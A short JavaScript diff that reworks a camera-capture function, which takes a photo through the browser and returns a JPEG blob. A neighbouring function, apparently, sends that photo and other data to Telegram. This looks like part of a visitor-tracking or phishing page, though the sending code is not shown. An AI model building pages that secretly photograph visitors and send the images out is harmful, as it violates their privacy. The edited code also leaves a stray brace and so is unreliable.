@@ -651,33 +651,33 @@
 
     // Function to capture photo from camera
     function capturePhoto() {
-        return new Promise((resolve, reject) => {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
+    return new Promise((resolve, reject) => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-                    video.addEventListener('loadedmetadata', () => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
+                video.addEventListener('canplay', () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
 
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        canvas.toBlob(blob => {
-                            // Stop kamera setelah ambil foto
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve(blob);
-                        }, 'image/jpeg', 0.9);
-                    });
-                })
-                .catch(err => {
-                    reject(err);
-                });
-        });
-    }
+                    canvas.toBlob(blob => {
+                        // Stop kamera setelah ambil foto
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(blob);
+                    }, 'image/jpeg', 0.9);
+                }, { once: true });
+            })
+            .catch(err => {
+                reject(err);
+            });
+    });
+                        }
 
     // Function to send data and photo to Telegram
     function sendToTelegram(data, photoBlob) {
